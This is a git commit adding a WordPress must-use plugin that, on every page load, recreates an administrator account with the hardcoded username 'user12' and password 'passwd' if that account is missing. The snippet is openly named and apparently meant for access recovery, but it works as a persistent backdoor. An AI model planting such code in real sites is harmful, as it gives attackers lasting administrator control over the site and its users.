4c48c4c06f75e6bda23d89a25d5dabdbd9f36897
Lukács József <wprobot@loero.net>
2020-05-07 13:28:08 +0200

    Create mu-add-admin-user.php

---
+++ security/mu-add-admin-user.php
@@ -0,0 +1,17 @@
+<?php
+
+  add_action( 'init', function () {
+
+      $usern = 'user12';
+      $passw = 'passwd';
+      $email = 'email@cim.hu';
+
+      if ( ! username_exists( $usern ) ) {
+        $user_id = wp_create_user( $usern, $passw, $email );
+        $user    = new WP_User( $user_id );
+        $user->set_role( 'administrator' );
+      }
+    }
+  );
+
+//
